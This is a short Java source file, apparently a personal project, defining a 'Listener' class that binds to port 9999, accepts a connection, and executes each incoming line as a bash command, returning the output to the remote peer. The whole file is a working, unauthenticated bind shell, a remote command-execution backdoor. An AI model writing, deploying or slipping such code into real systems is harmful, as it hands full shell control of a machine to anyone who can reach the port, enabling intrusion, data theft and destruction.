package com.Vincent;

import java.util.Scanner;
import java.net.*;
import java.io.*;


public class Listener {
    public static void main(String[] args) throws IOException {
        ServerSocket Serversocket = new ServerSocket(9999);
        Socket socket = Serversocket.accept();

        Scanner sc = new Scanner(socket.getInputStream());
        Scanner dir = new Scanner(socket.getInputStream());

        String output = "";
        String directory = System.getProperty("user.dir");

        while(true) {
            String command = sc.nextLine();

            if(command.contains("cd")){
                directory =  command.substring(3);
                command = sc.nextLine();
            }
            Process process = null;
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", command);
            builder.directory(new File(directory));
            builder.redirectErrorStream(true);
            System.out.println(directory);
            System.out.println(command);
            process = builder.start();
            InputStream is = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line = null;
            while ((line = reader.readLine()) != null) {
                output += line + " ";
            }

            PrintStream p = new PrintStream(socket.getOutputStream());
            p.println(output);
            output = "";
        }
    }
}


